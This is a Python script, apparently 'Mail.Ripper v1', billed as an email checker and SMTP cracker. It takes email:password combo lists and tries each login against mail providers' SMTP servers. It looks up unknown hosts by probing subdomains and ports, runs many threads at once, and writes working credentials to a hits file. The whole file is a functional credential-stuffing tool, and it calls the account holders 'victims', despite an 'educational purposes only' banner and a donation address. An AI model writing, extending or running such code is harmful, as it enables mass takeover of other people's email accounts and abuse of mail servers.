#!/usr/local/bin/python3
#encoding: utf-8
#name: Mail.Ripper v1
#description: basic e-mail checker and smtp cracker using smtplib
#version: 0.5, 2020-11-13
#author: DrPython3

#((--> *M*O*D*U*L*E*S***N*E*E*D*E*D* <--))
import ctypes, os, smtplib, socket, sys, ssl, threading, time
from time import sleep
import colorama
from colorama import *
init()
print(Fore.GREEN + Style.BRIGHT + '')

#((--> *S*T*A*R*T*U*P***L*O*G*O* <--))
logo1 = '''
-------------------------------------------------------------------------
                                                                         
o     o         o 8     .oPYo.  o                                     .o 
8b   d8           8     8   `8                                         8 
8`b d'8 .oPYo. o8 8    o8YooP' o8 .oPYo. .oPYo. .oPYo. oPYo.   o    o  8 
8 `o' 8 .oooo8  8 8     8   `b  8 8    8 8    8 8oooo8 8  `'   Y.  .P  8 
8     8 8    8  8 8     8    8  8 8    8 8    8 8.     8       `b..d'  8 
8     8 `YooP8  8 8 88  8    8  8 8YooP' 8YooP' `Yooo' 8        `YP'   8 
..::::..:.....::......::..:::..:..8 ....:8 ....::.....:..::::::::...:::..
::::::::::::::::::::::::::::::::::8 :::::8 ::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::..:::::..::::::::::::::::::::::::::::::
-------------------------------------------------------------------------
'''
logo2 = '''
              simple email checker by: DrPython3 (C) 2020
                 *** FOR EDUCATIONAL PURPOSES ONLY ***
                 
          DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
'''

#((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))
combofile = ''
combos = []
tout = float(60.0)
skip = 1
freddys = int(5)
valid = 0
bad = 0
hosters = {'gmail.com':'smtp.gmail.com','outlook.com':'smtp.live.com','office.com':'smtp.office365.com',
           'yahoo.com':'smtp.mail.yahoo.com','yahoo.co.uk':'smtp.mail.yahoo.co.uk','yahoo.de':'smtp.mail.yahoo.com',
           'aol.com':'smtp.aol.com','att.com':'smtp.att.yahoo.com','ntlworld.com':'smtp.ntlworld.com',
           'btconnect.com':'mail.btconnect.com','orange.co.uk':'smtp.orange.co.uk','wanadoo.co.uk':'smtp.wanadoo.co.uk',
           'o2online.de':'mail.o2online.de','t-online.de':'securesmtp.t-online.de','1and1.com':'smtp.1and1.com',
           '1und1.de':'smtp.1und1.de','comcast.net':'smtp.comcast.net','verizon.net':'outgoing.verizon.net',
           'mail.com':'smtp.mail.com','gmx.com':'smtp.gmx.com','gmx.de':'smtp.gmx.de','gmx.net':'smtp.gmx.net',
           '1and1.co.uk':'smtp.1und1.de','aim.com':'smtp.aim.com','alice-dsl.de':'smtp.alice-dsl.de',
           'alice-dsl.net':'smtp.alice-dsl.de','alice.it':'out.alice.it','epost.de':'mail.epost.de'}
hosterports = {'smtp.gmail.com':587,'smtp.live.com':587,'smtp.office365.com':587,'smtp.mail.yahoo.com':587,
               'plus.smtp.mail.yahoo.com':465,'smtp.mail.yahoo.co.uk':465,'smtp.mail.yahoo.com':465,
               'smtp.mail.yahoo.com.au':465,'smtp.o2.ie':25,'smtp.o2.co.uk':25,'smtp.aol.com':587,
               'smtp.att.yahoo.com':465,'smtp.ntlworld.com':465,'mail.btconnect.com':25,'mail.btopenworld.com':25,
               'mail.btinternet.com':25,'smtp.orange.co.uk':25,'smtp.wanadoo.co.uk':25,'smtp.live.com':465,
               'mail.o2online.de':25,'securesmtp.t-online.de':587,'smtp.1and1.com':587,'smtp.1und1.de':587,
               'smtp.comcast.net':587,'outgoing.verizon.net':465,'outgoing.yahoo.verizon.net':587,'smtp.zoho.com':465,
               'smtp.mail.com':587,'smtp.gmx.com':465,'smtp.gmx.de':465,'smtp.gmx.net':465}
subh = ['','mail.','webmail.','smtp.','mail2.','mx.','email.','mail1.','owa.','mx1.','exchange.','smtpauths.',
        'smtpauth.','smtp.mail.','smtp-mail.','securesmtp.']
subp = [587,465,25,2525,26]
blacklisted = ['gmail.com','googlemail.com','yahoo.com','hotmail.com','protonmail.com','yandex.ru']

#((--> *F*U*N*C*T*I*O*N*S* <--))
#cleaner == clears screen on purpose:
def cleaner():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass

#hits == saves hits to a txt file:
def hits(hitstext):
    with open('crackedsmtp.txt', 'a') as hitsfile:
        hitsfile.write(hitstext + '\n')
        hitsfile.close()

#skips == saves skipped combos to a txt file:
def skips(skiptext):
    with open('skippedcombos.txt', 'a') as skippedfile:
        skippedfile.write(skiptext + '\n')
        skippedfile.close()

#blackcheck == searches for smtp domain in blacklist:
def blackcheck(search):
    try:
        x = int(blacklisted.count(str(search)))
        if x == 0:
            return False
        else:
            return True
    except:
        pass

#finder == search for unknown smtp hosts:
def finder(unkdom):
    socket.setdefaulttimeout(tout)
    z = ''
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + 'Looking up SMTP-host for: ' + str(unkdom) + ' ...\n')
    try:
        for x in subh:
            y = str(x) + str(unkdom)
            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + 'Trying to connect to: ' + str(y) + ' ...\n')
            try:
                context = ssl.create_default_context()
                findsmtp = smtplib.SMTP_SSL(str(y), context=context)
                findsmtp.close()
                z = str(y)
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection successful, host is: ' + str(y) + ' ...\n')
            except:
                try:
                    findsmtp = smtplib.SMTP(str(y))
                    findsmtp.close()
                    z = str(y)
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Connection successful, host is: ' + str(y) + ' ...\n')
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Connection failed, invalid host: ' + str(y) + ' ...\n')
                    continue
        return z
    except BaseException:
        z = None
        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'Cannot establish any connection for host: ' + str(unkdom) + ' ...\n')
        return z

#attacker == connects to SMTP host, checks login data and returns result to checker:
def attacker(attackhost, attackport, attackuser, attackpass):
    socket.setdefaulttimeout(tout)
    try:
        if attackport == 0:
            print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + 'Unknown port for host ' + str(attackhost)
                  + ', trying to connect usinng most common ports now ...\n')
            for x in subp:
                p = x
                try:
                    context = ssl.create_default_context()
                    attack = smtplib.SMTP_SSL(str(attackhost), p, context=context)
                    attack.ehlo_or_helo_if_needed()
                    attack.close()
                    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Port for connection found: ' + str(p) + ' ...\n')
                    attackport = p
                except:
                    try:
                        attack = smtplib.SMTP(str(attackhost), p)
                        attack.ehlo_or_helo_if_needed()
                        attack.close()
                        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Port for connection found: ' + str(p) + ' ...\n')
                        attackport = p
                    except:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'CONNECTION ERROR (!) FOR HOST: ' + str(attackhost)
                              + ' ON PORT: ' + str(p) + ' ...\n')
                        try:
                            attack.close()
                        except:
                            pass
                        continue
        else:
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'Starting attack on: ' + str(attackhost) + ':' + str(attackport)
                  + ', USER: ' + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
        try:
            print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + 'Connecting to host ' + str(attackhost) + ':' + str(attackport)
                  + 'with SSL ...\n')
            context = ssl.create_default_context()
            attack = smtplib.SMTP_SSL(str(attackhost), attackport, context=context)
            attack.ehlo_or_helo_if_needed()
        except:
            try:
                print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + 'Connecting to host ' + str(attackhost) + ':'
                      + str(attackport) + ' without SSL ...\n')
                attack = smtplib.SMTP(str(attackhost), attackport)
                attack.ehlo_or_helo_if_needed()
            except:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'CONNECTION ERROR (!) FOR HOST: ' + str(attackhost)
                        + ' ON PORT: ' + str(attackport) + ' ...\n')
                return False, str(attackhost), attackport, str(attackuser), str(attackpass)
        if attackport == 587:
            try:
                context = ssl.create_default_context()
                attack.starttls(context=context)
                attack.ehlo_or_helo_if_needed()
            except:
                pass
        else:
            pass
        print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + 'Checking login-data: ' + str(attackhost) + ':' + str(attackport)
              + ', USER: ' + str(attackuser) + ', PASS: ' + str(attackpass) + ' ...\n')
        attack.login(str(attackuser), str(attackpass))
        try:
            attack.close()
        except:
            pass
        return True, str(attackhost), attackport, str(attackuser), str(attackpass)
    except:
        try:
            attack.close()
        except:
            pass
        return False, str(attackhost), attackport, str(attackuser), str(attackpass)

#inboxcheck == SMTP mailer which sends a mail to user address with cracked SMTP:
#TODO: Write and include inboxcheck() ...

#checkmate == the main checker based on smtplib:
def checkmate():
    global valid
    global bad
    while len(combos) > 0:
        checkresult = False
        th = ''
        tp = 0
        tuser = ''
        tpass = ''
        try:
            l = combos.pop(0).split(":")
            if skip == 1:
                print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + 'Checking blacklist for host: ' + str(l[0].split("@")[1])
                      + ' ...\n')
                blackhost = blackcheck(str(l[0].split("@")[1]))
                if blackhost == True:
                    skips(str(l[0]) + ':' + str(l[1]))
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'BAD LUCK, SKIPPED: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
                    bad += 1
                    continue
                else:
                    pass
            try:
                targethost = hosters[str(l[0].split("@")[1])]
            except:
                try:
                    newhost = finder(str(l[0].split("@")[1]))
                    if newhost == None:
                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HOST FOUND FOR COMBO: ' + str(l[0]) + ':'
                              + str(l[1]) + '.\n')
                        skips(str(l[0]) + ':' + str(l[1]))
                        bad += 1
                        continue
                    else:
                        targethost = str(newhost)
                except:
                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'ERROR(!) CANNOT LOOKUP HOST: ' + str(l[0]) + ':' + str(l[1])
                          + '.\n')
                    bad += 1
                    continue
            try:
                targetport = hosterports[str(targethost)]
            except:
                targetport = 0
            checkresult, th, tp, tuser, tpass = attacker(str(targethost), targetport, str(l[0]), str(l[1]))
            if checkresult == False:
                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, BAD COMBO: ' + str(tuser) + ':' + str(tpass) + ' ...\n')
                bad += 1
                continue
            elif tp == 465:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT ON VICTIM (!) HOST: ' + str(th) + ':465(SSL), USER: '
                      + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
            else:
                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '(!) HIT ON VICTIM (!) HOST: ' + str(th) + ':' + str(tp)
                      + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
            if tp == 465:
                hits('SERVER: ' + str(th) + ', PORT: 465(SSL), USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            else:
                hits('SERVER: ' + str(th) + ', PORT: ' + str(tp) + ', USER: ' + str(tuser) + ', PASS: ' + str(tpass))
            valid += 1
            #TODO: Include iniboxcheck() from here ...
        except:
            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, MISSED VICTIM AT: ' + str(th) + ':' + str(tp) + ', USER: '
                  + str(tuser) + ', PASS: ' + str(tpass) + ' ...\n')
            bad += 1
            continue

#((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))
#startup on clean screen with logos:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)

#ask for name of combofile:
combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')

#check combofile:
if combofile == '':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nNo filename entered. Bye bye!\n')
else:
    try:
        combos = open(combofile, 'r').read().splitlines()
    except:
        cleaner()
        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile not found. Check filename and start again!\n')

#return amount of combos to check:
tocheck = len(combos)
if tocheck == 0:
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile is empty. Bye bye!\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')

#ask for default timeout:
try:
    tout = float(input(Fore.LIGHTWHITE_EX + '\nEnter value of timeout (any key for default = 60.0) :     '))
except:
    tout = float(60.0)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')

#ask for amount of threads to use:
try:
    freddys = int(input(Fore.LIGHTWHITE_EX + '\nEnter amount of threads to use (any key for default = 5) :     '))
except:
    freddys = int(5)
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(freddys) + ' ...\n')

#ask for skipping options:
skipuser = input(Fore.LIGHTWHITE_EX
                 + '\nDo you want to skip services like GMAIL (yes / no, any key for default = yes) :    ')
if skipuser == 'no':
    skip = 0
elif skipuser == 'n':
    skip = 0
else:
    skip = 1
if skip == 0:
    print(Fore.LIGHTRED_EX + Style.BRIGHT
          + '\nWARNING: Services like GMAIL etc. will not be skipped! You probably waste your time ...\n')
else:
    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL etc. will be skipped and saved to a txt-file ...\n')

#ask to start checking:
startnow = input(Fore.LIGHTWHITE_EX + '\nDO YOU WANT TO START THE CHECKER NOW? (yes / no) :     ')
if startnow == 'no':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
elif startnow == 'n':
    cleaner()
    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
else:
    pass

#start checker:
cleaner()
print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now ...\n\n')
for _ in range(freddys):
    threading.Thread(target=checkmate).start()
while len(combos) > 0:
    try:
        #Show stats in title bar if run on Windows:
        sleep(0.1)
        ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
    #Skip stats in title bar on any other OS:
    except:
        pass
